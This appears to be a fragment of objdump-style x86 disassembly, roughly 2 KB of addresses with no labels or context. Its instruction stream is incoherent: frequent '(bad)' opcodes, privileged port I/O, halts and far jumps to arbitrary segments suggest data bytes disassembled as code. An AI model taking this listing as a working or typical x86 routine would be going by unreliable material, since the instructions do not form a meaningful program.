  412a9e:	mov    DWORD PTR [eax+ebp*4],edi
  412aa1:	adc    dh,BYTE PTR [esi]
  412aa3:	pop    ebx
  412aa4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412aa5:	in     al,dx
  412aa6:	adc    BYTE PTR [edi+0x28],dh
  412aa9:	xchg   DWORD PTR [eax+0x6e],esi
  412aac:	mov    edi,0x292bc33f
  412ab1:	test   eax,edi
  412ab3:	adc    BYTE PTR [esp+ebx*2],dl
  412ab6:	pop    ebp
  412ab7:	cmp    eax,0x890dec65
  412abc:	or     cl,BYTE PTR [ebp-0x73]
  412abf:	int    0x73
  412ac1:	add    bh,BYTE PTR [eax+0x4d461781]
  412ac7:	mov    esi,0x60aeb0e
  412acc:	daa    
  412acd:	pop    esp
  412ace:	loopne 0x412b05
  412ad0:	push   edi
  412ad1:	xor    BYTE PTR [ecx-0x14],ah
  412ad4:	add    al,0x9d
  412ad6:	pop    edi
  412ad7:	xor    al,0xf0
  412ad9:	cwde   
  412ada:	jg     0x412ac6
  412adc:	ror    cl,1
  412ade:	aaa    
  412adf:	in     eax,dx
  412ae0:	sub    edx,esi
  412ae2:	dec    ecx
  412ae3:	xor    ebx,DWORD PTR [esi]
  412ae5:	iret   
  412ae6:	push   ebx
  412ae7:	adc    bl,bh
  412ae9:	sub    esi,DWORD PTR [ecx-0xe7f386]
  412aef:	sub    al,0xc1
  412af1:	sub    BYTE PTR [ebx+0x71],ah
  412af4:	test   BYTE PTR [ebp+0xca70dd2],dl
  412afa:	das    
  412afb:	(bad)  
  412afc:	push   cs
  412afd:	adc    al,0x44
  412aff:	ins    DWORD PTR es:[edi],dx
  412b00:	xchg   esp,eax
  412b01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412b02:	retf   0x6f37
  412b05:	ficomp WORD PTR [edi-0x19fe374a]
  412b0b:	js     0x412b74
  412b0d:	xor    eax,0x7a46fd76
  412b12:	sbb    al,0x83
  412b14:	jmp    0xeaf8ea9e
  412b19:	xchg   esi,eax
  412b1a:	or     bh,BYTE PTR [ecx+0x61]
  412b1d:	stc    
  412b1e:	sub    BYTE PTR [ebx+0x1ce5b6cd],bl
  412b24:	and    eax,0xa2959b43
  412b29:	add    eax,0xda1ea123
  412b2e:	cdq    
  412b2f:	adc    al,0x1d
  412b31:	sub    al,BYTE PTR [edx+0x2]
  412b34:	pop    esi
  412b35:	mov    bl,0xf1
  412b37:	int3   
  412b38:	xchg   BYTE PTR [edx-0x9],ah
  412b3b:	and    eax,0x388554ab
  412b40:	imul   esi,DWORD PTR [ebx],0x31
  412b43:	cmp    ah,BYTE PTR [esi-0x12bb9ce4]
  412b49:	in     eax,0x8f
  412b4b:	and    cl,BYTE PTR [eax+edi*8+0x4503cac4]
  412b52:	aam    0xc8
  412b54:	push   ebp
  412b55:	lock sub edx,DWORD PTR [ebx]
  412b58:	xchg   edx,eax
  412b59:	add    eax,0x87dc0772
  412b5e:	xor    eax,0xef91f1b6
  412b63:	push   ds
  412b64:	div    esp
  412b66:	inc    ebx
  412b67:	xchg   ecx,eax
  412b68:	add    BYTE PTR [esi],0xfa
  412b6b:	sub    al,0x28
  412b6d:	xor    BYTE PTR [ebp+0x4c737e99],bh
  412b73:	std    
  412b74:	inc    esp
  412b75:	int3   
  412b76:	test   BYTE PTR [esi],bh
  412b78:	(bad)  
  412b79:	loope  0x412b9b
  412b7b:	stc    
  412b7c:	or     ecx,edi
  412b7e:	les    ebp,FWORD PTR [eax]
  412b80:	jmp    0xae8:0x7d75afb1
  412b87:	sti    
  412b88:	mov    dh,0xd8
  412b8a:	into   
  412b8b:	sub    DWORD PTR [edx+0x791e1e1c],ebp
  412b91:	mov    esp,DWORD PTR [eax-0x60]
  412b94:	sbb    DWORD PTR [eax-0x3b],0xd58b2d13
  412b9b:	sar    BYTE PTR [edi-0x4c7fe47],cl
  412ba1:	mov    ah,0xb4
  412ba3:	in     al,dx
  412ba4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412ba5:	popa   
  412ba6:	and    al,0x89
  412ba8:	push   eax
  412ba9:	push   eax
  412baa:	jle    0x412bf9
  412bac:	lahf   
  412bad:	lock pop eax
  412baf:	mov    bl,0x66
  412bb1:	std    
  412bb2:	(bad)  
  412bb3:	(bad)  
  412bb5:	xor    ecx,DWORD PTR [eax]
  412bb7:	jp     0x412b8f
  412bb9:	addr16 pop ebx
  412bbb:	neg    DWORD PTR [ebp-0x5cb968cf]
  412bc1:	jae    0x412b86
  412bc3:	cmp    eax,0x8bcddaf2
  412bc8:	mov    ecx,0xcf6031f0
  412bcd:	lea    edi,[ebp-0x13]
  412bd0:	fidiv  WORD PTR [ebx+0xa]
  412bd3:	jg     0x412c3f
  412bd5:	jecxz  0x412c25
  412bd7:	stos   DWORD PTR es:[edi],eax
  412bd8:	xor    al,0x5d
  412bda:	sub    al,0x68
  412bdc:	or     DWORD PTR cs:[ecx+0x6ed67958],eax
  412be3:	sbb    DWORD PTR [ebx-0x7273de7c],ecx
  412be9:	mov    dh,0x52
  412beb:	mov    esi,0xb8afd3ca
  412bf0:	xchg   DWORD PTR [edx+0x2b],esi
  412bf3:	jo     0x412c58
  412bf5:	les    eax,FWORD PTR [ebx+0x76]
  412bf8:	pop    eax
  412bf9:	push   ecx
  412bfa:	in     al,0x29
  412bfc:	ret    0xeef6
  412bff:	adc    ebp,DWORD PTR [eax+ebx*8-0x3dd4fd90]
  412c06:	adc    DWORD PTR [edi+0x6d498ad3],ebp
  412c0c:	or     esp,DWORD PTR [eax+ecx*2+0x1e]
  412c10:	pop    edi
  412c11:	mov    esi,0x34ce0690
  412c16:	loope  0x412bd2
  412c18:	jmp    0x412bf8
  412c1a:	(bad)  
  412c1b:	cmp    BYTE PTR [eax+edx*8-0x7f],bh
  412c1f:	dec    eax
  412c20:	leave  
  412c21:	jns    0x412bf0
  412c23:	jecxz  0x412c85
  412c25:	push   edi
  412c26:	jge    0x412bb7
  412c28:	stc    
  412c29:	jmp    0x412c4f
  412c2b:	jg     0x412c29
  412c2d:	dec    esp
  412c2e:	adc    BYTE PTR [edi-0x33],dl
  412c31:	scas   al,BYTE PTR es:[edi]
  412c32:	sub    eax,0xbb088d15
  412c37:	xlat   BYTE PTR ds:[ebx]
  412c38:	mov    BYTE PTR [edi+edx*8],dh
  412c3b:	hlt    
  412c3c:	loopne 0x412c0c
  412c3e:	dec    esp
  412c3f:	jp     0x412ca1
  412c41:	adc    al,0xde
  412c43:	push   ecx
  412c44:	stc    
  412c45:	test   al,0xc8
  412c47:	imul   edi,eax,0x9faa3d9e
  412c4d:	mov    ebp,esi
  412c4f:	add    eax,eax
  412c51:	or     ch,BYTE PTR [ecx+0x19]
  412c54:	(bad)  
  412c55:	js     0x412cbb
  412c57:	imul   esp,DWORD PTR [edx],0xffffffc5
  412c5a:	cld    
  412c5b:	nop
  412c5c:	jmp    0x412cc4
  412c5e:	bsr    esi,DWORD PTR [eax]
  412c61:	adc    eax,0xbd912425
  412c66:	sub    BYTE PTR [esi-0x74398789],0x5d
  412c6d:	aad    0xf9
  412c6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412c70:	xchg   esp,eax
  412c71:	mov    ebp,0x10ab08fd
  412c76:	popf   
  412c77:	outs   dx,BYTE PTR ds:[esi]
  412c78:	cmp    DWORD PTR [esi+0x7a],ebp
  412c7b:	mov    ebx,0xb736be8f
  412c80:	xchg   esp,eax
  412c81:	xor    al,0x1a
  412c83:	cwde   
  412c84:	xlat   BYTE PTR ds:[ebx]
  412c85:	arpl   WORD PTR [esi-0x41],bx
  412c88:	adc    eax,0xace52010
  412c8d:	or     DWORD PTR [ebx+0x53],esp
  412c90:	mov    ds:0xe9acb2aa,eax
  412c95:	mov    dh,0x5f
  412c97:	icebp  
  412c98:	hlt    
  412c99:	ja     0x412c7e
  412c9b:	mov    ch,cl
  412c9d:	inc    edi
  412c9e:	jmp    0x33fe:0xdc9477ee
  412ca5:	cli    
  412ca6:	jge    0x412c47
  412ca8:	call   0x69fb:0x928de0d
  412caf:	pop    ds
  412cb0:	and    DWORD PTR [eax-0x2a],0xf5b5305
  412cb7:	adc    eax,0x189edbd5
  412cbc:	xor    ch,BYTE PTR [eax]
  412cbe:	sub    ah,bh
  412cc0:	sub    dh,bl
  412cc2:	nop
  412cc3:	outs   dx,DWORD PTR ds:[esi]
  412cc4:	fcom   QWORD PTR ds:0x70d9378d
  412cca:	push   ebp
  412ccb:	inc    eax
  412ccc:	cmp    BYTE PTR [ecx-0x5f],ch
  412ccf:	lods   al,BYTE PTR ds:[esi]
  412cd0:	ds or  eax,0x1412cdad
  412cd6:	clc    
  412cd7:	mov    ebx,0x9ad84bb7
  412cdc:	retf   
  412cdd:	xchg   ebp,eax
  412cde:	fsubr  QWORD PTR [edx]
  412ce0:	into   
  412ce1:	xchg   edi,eax
  412ce2:	dec    edi
  412ce3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412ce4:	inc    esi
  412ce5:	push   ebx
  412ce6:	sbb    al,0x4
  412ce8:	sub    BYTE PTR [edx+0x7e3afea3],dl
  412cee:	jbe    0x412cfb
  412cf0:	dec    edx
  412cf1:	add    cl,ch
  412cf3:	add    DWORD PTR [ecx+0x35],0xfffffff0
  412cf7:	ss push esp
  412cf9:	sar    DWORD PTR [ebx-0x189ab0c9],1
  412cff:	jg     0x412d72
  412d01:	sbb    ebp,DWORD PTR [ecx+ebp*2+0x7e]
  412d05:	out    0x13,eax
  412d07:	dec    ebx
  412d08:	dec    ebx
  412d09:	mov    cl,0xf6
  412d0b:	jg     0x412d2e
  412d0d:	fadd   DWORD PTR [edx+0x674c565c]
  412d13:	test   eax,0xa57f250a
  412d18:	cli    
  412d19:	cmc    
  412d1a:	cmp    DWORD PTR [ecx],ecx
  412d1c:	sub    dh,BYTE PTR [edx]
  412d1e:	test   BYTE PTR [eax*4+0x1d6cd43f],dl
  412d25:	mov    dl,0xae
  412d27:	add    DWORD PTR [eax+0x5f],eax
  412d2a:	xchg   ecx,eax
  412d2b:	icebp  
  412d2c:	sub    dx,WORD PTR [edx+0x39]
  412d30:	push   esi
  412d31:	or     DWORD PTR [edi],eax
  412d33:	aam    0xce
  412d35:	inc    eax
  412d36:	xor    eax,0x6b406931
  412d3b:	call   esp
  412d3d:	mov    al,0x16
  412d3f:	jb     0x412d2b
  412d41:	xchg   esp,eax
  412d42:	jmp    0xa4b0:0x41d6186d
  412d49:	push   es
  412d4a:	icebp  
  412d4b:	push   es
  412d4c:	inc    eax
  412d4d:	jo     0x412d19
  412d4f:	loop   0x412d1d
  412d51:	push   es
  412d52:	cmp    DWORD PTR [edx],ebp
  412d54:	lods   eax,DWORD PTR ds:[esi]
  412d55:	gs adc al,0xc4
  412d58:	sbb    al,0x39
  412d5a:	or     al,0x5a
  412d5c:	push   eax
  412d5d:	xor    al,0x53
  412d5f:	outs   dx,BYTE PTR ds:[esi]
  412d60:	push   ds
  412d61:	jg     0x412ce6
  412d63:	mov    ds:0x12681caa,eax
  412d68:	clc    
  412d69:	stos   DWORD PTR es:[edi],eax
  412d6a:	lods   eax,DWORD PTR ds:[esi]
  412d6b:	in     al,0x5d
  412d6d:	into   
  412d6e:	push   0x3f0214be
  412d73:	jmp    0x90bf86f8
  412d78:	jns    0x412d20
  412d7a:	call   0x43cb1993
  412d7f:	fcmovnb st,st(5)
  412d81:	xchg   ebp,eax
  412d82:	test   BYTE PTR [edx-0x63],al
  412d85:	rcr    DWORD PTR [eax+0x3a],0xb8
  412d89:	ja     0x412de0
  412d8b:	cmp    eax,0xcc7dfdb5
  412d90:	loope  0x412dda
  412d92:	cmp    ecx,DWORD PTR [ebx+0x11a3f60d]
  412d98:	xchg   esp,eax
  412d99:	hlt    
  412d9a:	shr    BYTE PTR ds:0x24e8e0c2,1
  412da0:	ins    DWORD PTR es:[edi],dx
  412da1:	dec    ebx
  412da2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412da3:	xor    eax,0x1c16bfef
  412da8:	xor    BYTE PTR [esi],ah
  412daa:	xchg   BYTE PTR [edx],bl
  412dac:	fisubr WORD PTR [edi+0x56]
  412daf:	sub    esp,DWORD PTR [eax+edi*1-0x25]
  412db3:	mov    al,ds:0xe3bdfbb7
  412db8:	loop   0x412e0d
  412dba:	jbe    0x412dca
  412dbc:	imul   BYTE PTR [esi-0x31]
  412dbf:	mov    bl,BYTE PTR [ecx]
  412dc1:	jg     0x412d9b
  412dc3:	test   al,0xff
  412dc5:	jnp    0x412e32
  412dc7:	and    DWORD PTR [edx+0x4fba274c],esi
  412dcd:	pop    eax
  412dce:	sub    al,0xe9
  412dd0:	lea    eax,[edx+ebp*1-0x19]
  412dd4:	push   esp
  412dd5:	and    eax,0x3ea79329
  412dda:	inc    ebp
  412ddb:	mov    ds:0x36c5b6d4,eax
  412de0:	cmp    esi,DWORD PTR [ecx]
  412de2:	sahf   
  412de3:	push   cs
  412de4:	shl    DWORD PTR [eax],1
  412de6:	xchg   BYTE PTR [edx+0x193eb13e],ah
  412dec:	jg     0x412e58
  412dee:	mov    ebp,0x3fa8cf42
  412df3:	aam    0x17
  412df5:	inc    ebx
  412df6:	out    dx,eax
  412df7:	dec    ebp
  412df8:	jecxz  0x412d84
  412dfa:	cs fwait
  412dfc:	call   0x8baf:0xae8eb80e
  412e03:	in     eax,0xd
  412e05:	inc    DWORD PTR [esp+ebp*8]
  412e08:	sbb    ebp,ebx
  412e0a:	and    eax,0x653dbfe2
  412e0f:	lods   eax,DWORD PTR ds:[esi]
  412e10:	repnz xchg ebp,eax
  412e12:	ror    BYTE PTR [edi],1
  412e14:	push   esi
  412e15:	shl    DWORD PTR [edi+0x3f0d958d],cl
  412e1b:	and    al,0xec
  412e1d:	cmp    eax,0x3904550f
  412e22:	jmp    0xd80a:0x689708eb
  412e29:	push   esp
  412e2a:	es pop edx
  412e2c:	sub    al,0xbb
  412e2e:	out    dx,eax
  412e2f:	inc    esp
  412e30:	adc    al,0x27
  412e32:	nop
  412e33:	dec    esi
  412e34:	push   es
  412e35:	push   edx
  412e36:	fs fs in al,0x2b
  412e3a:	inc    ebx
  412e3b:	aam    0x3e
  412e3d:	or     esp,edi
  412e3f:	sbb    DWORD PTR [ecx],esp
  412e41:	mov    dl,0x76
  412e43:	pop    ebx
  412e44:	mov    dh,0xf6
  412e46:	ins    BYTE PTR es:[edi],dx
  412e47:	(bad)  
  412e48:	xor    al,ch
  412e4a:	sub    dl,ch
  412e4c:	jl     0x412dea
  412e4e:	int3   
  412e4f:	mov    eax,DWORD PTR [edx-0x73567f0b]
  412e55:	sbb    DWORD PTR [ebx+esi*1+0x1f],0xf9d203de
  412e5d:	xchg   ebp,eax
  412e5e:	cmp    BYTE PTR [eax*2-0x76c6380d],bh
  412e65:	jnp    0x412e93
  412e67:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412e68:	jno    0x412e50
  412e6a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412e6b:	out    0xca,eax
  412e6d:	loope  0x412e58
  412e6f:	in     eax,dx
  412e70:	inc    ebx
  412e71:	push   ebx
  412e72:	inc    esi
  412e73:	aam    0x8c
  412e75:	mov    al,0xe8
  412e77:	jl     0x412e9d
  412e79:	add    edi,DWORD PTR [ecx+0x7b25d9fb]
  412e7f:	push   eax
  412e80:	pop    ecx
  412e81:	out    0xb5,al
  412e83:	cmp    BYTE PTR [eax+0x3854baf2],dh
  412e89:	daa    
  412e8a:	int    0x4c
  412e8c:	pop    ebp
  412e8d:	xchg   edi,eax
  412e8e:	xor    eax,DWORD PTR fs:[edx]
  412e91:	jg     0x412e8d
  412e93:	xchg   ebx,eax
  412e94:	inc    ecx
  412e95:	call   0x1862:0xff3b1042
  412e9c:	test   DWORD PTR [edi],esi
  412e9e:	daa    
  412e9f:	cmp    DWORD PTR [eax+edx*8],edi
  412ea2:	pop    ebp
  412ea3:	xor    al,0x21
  412ea5:	outs   dx,DWORD PTR ds:[esi]
  412ea6:	xchg   ebp,eax
  412ea7:	dec    ecx
  412ea8:	add    DWORD PTR ds:0xdc324831,ecx
  412eae:	mov    cl,0x43
  412eb0:	or     al,0xf3
  412eb2:	(bad)  
  412eb3:	mov    edi,0x3b011b79
  412eb8:	jle    0x412e58
  412eba:	or     ah,BYTE PTR [ebx-0x2d984d3b]
  412ec0:	and    al,cl
  412ec2:	inc    ebp
  412ec3:	iret   
  412ec4:	out    0xa1,al
  412ec6:	imul   edi,DWORD PTR [edx+0x8edad2b],0xffffffaf
  412ecd:	inc    esi
  412ece:	jo     0x412f0f
  412ed0:	inc    ecx
  412ed1:	jp     0x412efe
  412ed3:	loopne 0x412e91
  412ed5:	and    eax,0xb000552d
  412eda:	(bad)  
  412edb:	or     esi,ecx
  412edd:	xor    esp,DWORD PTR [ebp-0x4b]
  412ee0:	fcom   QWORD PTR [esp+ebp*4-0x3c]
  412ee4:	adc    BYTE PTR ds:0xc489b16c,dl
  412eea:	xchg   ebx,eax
  412eeb:	loop   0x412ebb
  412eed:	push   ds
  412eee:	aad    0xe
  412ef0:	adc    al,0x50
  412ef2:	pop    eax
  412ef3:	pop    ds
  412ef4:	(bad)  
  412ef5:	mov    al,ds:0x8870d78e
  412efa:	mov    esp,0xb7afb4ad
  412eff:	xlat   BYTE PTR ds:[ebx]
  412f00:	or     al,BYTE PTR [edi-0x68]
  412f03:	cwde   
  412f04:	arpl   WORD PTR [ebp+0x1f],bx
  412f07:	sahf   
  412f08:	xor    BYTE PTR [ecx],bl
  412f0a:	mov    al,ds:0x9bcbdbc3
  412f0f:	dec    edi
  412f10:	push   ecx
  412f11:	fstp   TBYTE PTR [ebp+0x68]
  412f14:	in     al,0x94
  412f16:	sub    BYTE PTR [ebx+0x56],al
  412f19:	inc    edi
  412f1a:	sub    al,BYTE PTR [edx+0x5a]
  412f1d:	adc    ah,ch
  412f1f:	inc    edx
  412f20:	repnz stos BYTE PTR es:[edi],al
  412f22:	inc    edi
  412f23:	stos   BYTE PTR es:[edi],al
  412f24:	inc    eax
  412f25:	jge    0x412f82
  412f27:	into   
  412f28:	sub    ebx,DWORD PTR ds:0xa553d68a
  412f2e:	dec    ebx
  412f2f:	sub    esi,DWORD PTR [ebx]
  412f31:	(bad)  
  412f32:	adc    ah,BYTE PTR [edi]
  412f34:	mov    ds:0xcd7fe943,al
  412f39:	push   ecx
  412f3a:	sub    cl,BYTE PTR [eax]
  412f3c:	xchg   ecx,eax
  412f3d:	add    DWORD PTR [ebx+0x249c5c43],edi
  412f43:	psubb  mm3,QWORD PTR [eax-0xe4cbcde]
  412f4a:	fst    QWORD PTR [esi-0x8a4a390]
  412f50:	sbb    al,0x54
  412f52:	inc    ecx
  412f53:	(bad)  
  412f54:	sub    DWORD PTR gs:[esp+eax*8+0x9016ff7],0xffffffc6
  412f5d:	leave  
  412f5e:	(bad)  
  412f5f:	addr16 dec eax
  412f61:	ror    DWORD PTR [ebp+0x62],0x18
  412f65:	cli    
  412f66:	mov    esp,0x604d72f8
  412f6b:	gs mov bl,0xcf
  412f6e:	sub    bl,BYTE PTR [ebx+ebx*4+0x29]
  412f72:	les    eax,FWORD PTR [ebp+0x96fb6fc]
  412f78:	cmp    cl,BYTE PTR [edi+0x6d]
  412f7b:	adc    DWORD PTR [ebx-0x4c],edx
  412f7e:	and    ebx,edi
  412f80:	mov    eax,ds:0x3f7b261
  412f85:	shl    ah,0x50
  412f88:	ss mov ebp,0x500ef8f2
  412f8e:	je     0x412f9d
  412f90:	leave  
  412f91:	jp     0x412f53
  412f93:	push   edi
  412f94:	pop    esp
  412f95:	das    
  412f96:	mov    ebp,0xb3234f6b
  412f9b:	mov    cl,0xca
  412f9d:	or     dh,ah
  412f9f:	(bad)  
  412fa0:	pop    ecx
  412fa1:	fnstsw WORD PTR [edx+0x31]
  412fa4:	sub    DWORD PTR [ebp+0x0],0x92b905b2
  412fab:	cmp    edx,ebx
  412fad:	(bad)  
  412fae:	imul   ecx,DWORD PTR [ecx+ebx*2],0x57d55790
  412fb5:	xchg   ebp,eax
  412fb6:	xchg   edi,eax
  412fb7:	mov    WORD PTR es:[ecx+esi*2+0x6e9d8ee8],cs
  412fbf:	dec    eax
  412fc0:	and    eax,ebx
  412fc2:	push   esi
  412fc3:	push   ebp
  412fc4:	mov    ebp,0x460155a2
  412fc9:	cmc    
  412fca:	imul   eax,DWORD PTR [edx+0x3f],0x97eecd60
  412fd1:	test   eax,0x4c503e3b
  412fd6:	into   
  412fd7:	int    0x98
  412fd9:	mov    esi,0x7a48aaeb
  412fde:	sbb    eax,0xffffffaa
  412fe1:	shl    dl,0x91
  412fe4:	sar    BYTE PTR [ebp-0x65c0a3b8],cl
  412fea:	and    al,0x6f
  412fec:	xchg   esp,eax
  412fed:	outs   dx,DWORD PTR ds:[esi]
  412fee:	or     dh,ah
  412ff0:	add    ebx,DWORD PTR [esi]
  412ff2:	cdq    
  412ff3:	add    al,0x7e
  412ff5:	jmp    0x413008
  412ff7:	add    BYTE PTR [edx+0x9],bh
  412ffa:	fsubrp st(3),st
  412ffc:	rcl    DWORD PTR [eax+0x281f5e43],1
  413002:	(bad)  
  413003:	pop    ebp
  413004:	jns    0x412fdd
  413006:	daa    
  413007:	or     eax,0x8d874428
  41300c:	jmp    0xf7da:0x84cfeb82
  413013:	(bad)  
  413014:	jmp    0x413050
  413016:	xchg   esi,eax
  413017:	mov    ebx,0x8143c746
  41301c:	popf   
  41301d:	adc    al,BYTE PTR [edi+0x7]
  413020:	push   edi
  413021:	cdq    
  413022:	je     0x412fb0
  413024:	mov    cl,bl
  413026:	shl    BYTE PTR [edi],0x5c
  413029:	aad    0x5f
  41302b:	lods   al,BYTE PTR ds:[esi]
  41302c:	dec    edi
  41302d:	xchg   edi,eax
  41302e:	pop    edi
  41302f:	inc    esp
  413030:	sahf   
  413031:	aad    0x38
  413033:	test   eax,0x3435d564
  413038:	retf   0x3365
  41303b:	ins    BYTE PTR es:[edi],dx
  41303c:	sbb    eax,ebp
  41303e:	call   0x5bf11cb
  413043:	mov    cl,0x13
  413045:	mov    ch,0xf6
  413047:	cmp    BYTE PTR [ebp+0xcdaf1a9],cl
  41304d:	loop   0x413094
  41304f:	cli    
  413050:	xchg   esp,eax
  413051:	cmp    edx,DWORD PTR [edi+0x7d]
  413054:	dec    esp
  413055:	sar    DWORD PTR [ecx+0x5d],0xfa
  413059:	gs mov eax,0x303261de
  41305f:	in     eax,0x55
  413061:	cmp    ebx,DWORD PTR [ecx]
  413063:	add    BYTE PTR [ebp-0x24d23d08],0xf6
  41306a:	ret    0x96e5
  41306d:	jo     0x413097
  41306f:	test   eax,0x30eefdd9
  413074:	xchg   ecx,eax
  413075:	(bad)  
  413076:	aad    0xa0
  413078:	mov    bh,0x3d
  41307a:	stc    
  41307b:	lods   eax,DWORD PTR ds:[esi]
  41307c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41307d:	and    bh,BYTE PTR [esi+0x2d]
  413080:	stc    
  413081:	inc    esi
  413082:	or     al,0x1d
  413084:	xchg   esp,eax
  413085:	ins    DWORD PTR es:[edi],dx
  413086:	in     eax,0x27
  413088:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413089:	xor    ebx,eax
  41308b:	sbb    eax,0x863be880
  413090:	jg     0x4130e3
  413092:	push   0xffffffeb
  413094:	push   esi
  413095:	(bad)  
  413096:	cmp    eax,0x40cbfa69
  41309b:	mov    edx,0x6f3cbd28
  4130a0:	adc    dl,ch
  4130a2:	das    
  4130a3:	jge    0x4130cc
  4130a5:	dec    ecx
  4130a6:	push   ebx
  4130a7:	out    dx,al
  4130a8:	sbb    DWORD PTR [ebx+0x26526c37],ebp
  4130ae:	pop    esp
  4130af:	cmp    cl,BYTE PTR [edx]
  4130b1:	adc    al,0x36
  4130b3:	cld    
  4130b4:	stc    
  4130b5:	int3   
  4130b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4130b7:	imul   ecx,DWORD PTR ds:0xe46f972,0x79d4b9ab
  4130c1:	sbb    ch,al
  4130c3:	fmul   QWORD PTR [ebx+eax*1-0x3ef991c6]
  4130ca:	mov    al,0xcc
  4130cc:	test   eax,0xcf5d78ba
  4130d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4130d2:	inc    ebp
  4130d3:	mov    BYTE PTR [edx+eax*8],bl
  4130d6:	pop    edx
  4130d7:	sbb    al,bh
  4130d9:	sbb    al,0xc2
  4130db:	dec    eax
  4130dc:	adc    BYTE PTR [edx+eax*1-0x2204389a],al
  4130e3:	clc    
  4130e4:	iret   
  4130e5:	dec    eax
  4130e6:	xor    ch,BYTE PTR [eax-0x64c3b88d]
  4130ec:	mov    bh,0x44
  4130ee:	or     BYTE PTR [ebp+0x72],ah
  4130f1:	repnz dec esp
  4130f3:	out    0xfc,eax
  4130f5:	fsubr  QWORD PTR [edi+0x7c]
  4130f8:	fchs   
  4130fa:	push   edi
  4130fb:	push   eax
  4130fc:	mov    edi,0xe13b6d88
  413101:	cld    
  413102:	mov    esi,0x12742e99
  413107:	bound  eax,QWORD PTR [ecx]
  413109:	cmp    ebx,ecx
  41310b:	bound  esi,QWORD PTR [esi-0x72]
  41310e:	retf   
  41310f:	or     eax,0x1543abf
  413114:	inc    ecx
  413115:	sbb    ah,bl
  413117:	pop    edi
  413118:	sbb    DWORD PTR [edi],0xffffffb1
  41311b:	cmp    bh,al
  41311d:	mov    BYTE PTR [ebx+0x67],ch
  413120:	(bad)  
  413121:	mov    ecx,0x33928bf
  413126:	sbb    al,0x7
  413128:	hlt    
  413129:	mov    dl,BYTE PTR [ebp+0x743cd99d]
  41312f:	or     ebp,0xffffffed
  413132:	cmp    ebx,0x617a2362
  413138:	rcl    esp,cl
  41313a:	xor    eax,0x68d958a1
  41313f:	aaa    
  413140:	les    ebp,FWORD PTR [ebx+0x79]
  413143:	dec    edi
  413144:	jb     0x413171
  413146:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413147:	cld    
  413148:	jae    0x4130e6
  41314a:	test   bh,0xcc
  41314d:	or     ch,BYTE PTR [ebx+0x5]
  413150:	mov    bl,0x3f
  413152:	sub    eax,0x38cc53f4
  413157:	cwde   
  413158:	mov    ds:0x92461d8f,al
  41315d:	mov    ebx,DWORD PTR [ebp+0x6b9c906b]
  413163:	mov    ah,0x52
  413165:	adc    ah,BYTE PTR [esi-0x110c3d7]
  41316b:	fidivr WORD PTR [eax+eax*8+0x1941837]
  413172:	outs   dx,DWORD PTR ds:[esi]
  413173:	add    BYTE PTR [eax],al
  413175:	xor    BYTE PTR [ecx],0x12
  413178:	or     DWORD PTR [edx-0x4883eba9],eax
  41317e:	lea    eax,[ecx+0x55]
  413181:	cwde   
  413182:	jno    0x413159
  413184:	sub    cl,BYTE PTR [eax-0x53]
  413187:	inc    edx
  413188:	fcompp 
  41318a:	fs fs iret 
  41318d:	icebp  
  41318e:	xchg   ecx,eax
  41318f:	cmp    ebx,DWORD PTR [ebx+0x6f]
  413192:	xor    al,0x54
  413194:	std    
  413195:	sub    bl,BYTE PTR gs:[ebx+ebp*8-0x1b]
  41319a:	scas   al,BYTE PTR es:[edi]
  41319b:	lds    edx,FWORD PTR [esi-0x6a]
  41319e:	aas    
  41319f:	xchg   ebp,eax
  4131a0:	icebp  
  4131a1:	xor    eax,0x3e936a9c
  4131a6:	std    
  4131a7:	mov    eax,0x37be9210
  4131ac:	fld    TBYTE PTR [ecx+0x10]
  4131af:	adc    BYTE PTR [esp+esi*1-0x7],bh
  4131b3:	aas    
  4131b4:	std    
  4131b5:	shl    eax,1
  4131b7:	aaa    
  4131b8:	sbb    eax,0x7381e01e
  4131bd:	loope  0x4131b3
  4131bf:	out    0xe3,al
  4131c1:	or     al,0x53
  4131c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4131c4:	sub    DWORD PTR [edi],eax
  4131c6:	ficom  DWORD PTR [eax-0x36ee5d12]
  4131cc:	add    eax,0x2e77f05
  4131d1:	iret   
  4131d2:	(bad)  
  4131d3:	loopne 0x41317b
  4131d5:	add    eax,0x54d05ec5
  4131da:	push   0x51caf6e5
  4131df:	aam    0xcb
  4131e1:	jecxz  0x413252
  4131e3:	mov    ebx,0xabdce41f
  4131e8:	mov    al,0xf5
  4131ea:	mov    ds:0x5c5dfeb1,eax
  4131ef:	xchg   ecx,eax
  4131f0:	pop    eax
  4131f1:	scas   eax,DWORD PTR es:[edi]
  4131f2:	imul   BYTE PTR ds:0xca8722ed
  4131f8:	add    al,0x1d
  4131fa:	dec    eax
  4131fb:	mov    ebx,0x21f7b743
  413200:	sbb    edi,DWORD PTR [edx+edi*2]
  413203:	lds    edi,FWORD PTR [ebp+esi*1-0x6a7099bc]
  41320a:	cdq    
  41320b:	xchg   edi,eax
  41320c:	or     ah,BYTE PTR [esp+esi*4+0x26]
  413210:	push   cs
  413211:	dec    ebx
  413212:	add    DWORD PTR [ebx+0x72],esp
  413215:	xor    al,0xad
  413217:	xor    edx,edx
  413219:	iret   
  41321a:	das    
  41321b:	icebp  
  41321c:	and    BYTE PTR [edx+0x49e708e6],ah
  413222:	inc    esp
  413223:	call   0x8f03:0x59617f7
  41322a:	jmp    0x31610153
  41322f:	aaa    
  413230:	(bad)  
  413231:	call   0xeb5f2430
  413236:	into   
  413237:	call   0x8400c994
  41323c:	not    DWORD PTR [esi]
  41323e:	(bad)  
  41323f:	in     al,0x27
  413241:	sbb    al,0x58
  413243:	lods   eax,DWORD PTR gs:[esi]
  413245:	retf   0x5f7f
  413248:	mov    bl,0x14
  41324a:	pop    edx
  41324b:	jo     0x4132b9
